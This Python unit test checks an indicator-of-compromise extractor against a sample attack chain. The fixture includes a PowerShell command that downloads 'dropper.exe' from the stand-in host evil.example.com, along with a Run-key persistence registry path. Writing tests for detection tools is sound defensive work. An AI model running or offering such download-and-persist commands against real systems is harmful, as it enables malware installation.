from app.services.ioc_extractor import extract_iocs_from_chains


def test_extract_iocs_from_chain_actions():
    chains = [
        {
            "actions": [
                {
                    "command_line": (
                        "powershell iwr http://evil.example.com/dropper.exe "
                        "-OutFile C:\\Users\\Public\\dropper.exe"
                    ),
                    "destination_ip": "8.8.8.8",
                    "hashes": "SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                }
            ]
        }
    ]

    iocs = extract_iocs_from_chains(chains)

    assert "8.8.8.8" in iocs["ips"]
    assert "evil.example.com" in iocs["domains"]
    assert "http://evil.example.com/dropper.exe" in iocs["urls"]
    assert "c:\\users\\public\\dropper.exe" not in iocs["file_paths"]
    assert "C:\\Users\\Public\\dropper.exe" in iocs["file_paths"]
    assert "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" in iocs["registry_keys"]
    assert "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" in iocs["hashes"]
